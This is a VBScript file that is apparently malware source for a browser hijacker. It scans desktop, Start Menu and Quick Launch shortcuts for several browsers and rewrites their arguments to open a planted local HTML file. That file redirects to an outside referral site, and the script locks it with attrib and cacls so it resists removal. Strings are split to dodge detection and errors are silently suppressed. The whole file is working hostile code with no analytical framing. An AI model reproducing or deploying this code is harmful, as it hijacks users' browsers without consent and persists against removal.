 on error resume next 

'<!-- wP6nNgcvzWhc6mEq63h9 -->
Set WshShell = WScript.CreateObject("WSc" & "ript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Fa" & "vorites") :'�����ļ��С����桱


strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
iescc=strttWinDir & "\Internet Explorer\iexplore"&".exe"
ssd="ճ��"
winds = WshShell.ExpandEnvironmentStrings("%System" & "Root%")

'<!-- wP6nNgcvzWhc6mEq63h9 -->
Sub RCST123456789(lnktz)
Dim oldpath
    oldpath = LCase(lnktz)
Dim Wsh

Set Wsh = WScript.CreateObject("WScr" & "ipt.Shell")

Dim Folders
Folders = Wsh.SpecialFolders("AllUsersDesktop")
 
Call SetLinkArg(Folders,oldpath)

Folders = Wsh.SpecialFolders("Desktop")
 
Call SetLinkArg(Folders,oldpath)
 

Folders = Wsh.SpecialFolders.Item("StartMenu")
  
Call SetLinkArg(Folders,oldpath)

   
Folders = Wsh.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"
 
Call SetLinkArg(Folders,oldpath)


Folders = Wsh.SpecialFolders.Item("AllUsersStartMenu")
 
Call SetLinkArg(Folders,oldpath)

Set WSH = Nothing
End Sub


Sub SetLinkArg(Folders , oldpath)
  Dim Wsh,fso,f,fc,f1,f2
  
   
  Set Wsh = WScript.CreateObject("WScript.Shell")
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim newpath
  newpath = """"& strttWinDir &"\NetMeeting\ie.html"""
  
  Set f = fso.GetFolder(Folders)
  Set fc = f.Files
   For Each f1 in fc
      f2=LCase(f1)
      ext = LCase(fso.GetExtensionName(f2))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f2)
        If Instr(LCase(oShLnk.TargetPath),oldpath) > 0 Then
       		oShLnk.Arguments = newpath
       		oShLnk.Save      
		End If
   Set oShLnk=NoThing
      end if
   Next
Set WSH = Nothing
  

End Sub

Call RCST123456789("TTraveler"&".exe")
Call RCST123456789("SogouExplorer.exe")
Call RCST123456789("TheWorld.exe")
Call RCST123456789("Maxthon.exe")
Call RCST123456789("Maxthon2.exe")
Call RCST123456789("360SE"&".exe")

Call RCST123456789("IEXPLOR"&"E.EXE")


CopyPath=WSHShell.ExpandEnvironmentStrings("%SystemRoot%") & "\" '��ȡ
ScriptEx=CopyPath & "System32\WScript.exe"
Rem "#REM#" 
Dim url
url = "http://www.1122p.com/?i"

Set fso = CreateObject("Script" & "ing.FileSystemObject")
FileName=  strttWinDir & "\NetMeeting\ie.html"
if not fso.FileExists(FileName) then
  Set MyFile = fso.CreateTextFile(FileName,True)
  MyFile.Write("<meta http-equiv=""refresh""                                                                           				                                               content=""0.1;url="&url&"/?http://www.baidu.com/"">")
  MyFile.Close

 
 WshShell.run "attrib """ & FileName & """ +R",0
 WshShell.run "cmd /c echo Y| cacls """ & FileName & """ /P Everyone:R",0
end If


'<!-- wP6nNgcvzWhc6mEq63h9 -->

WScript.quit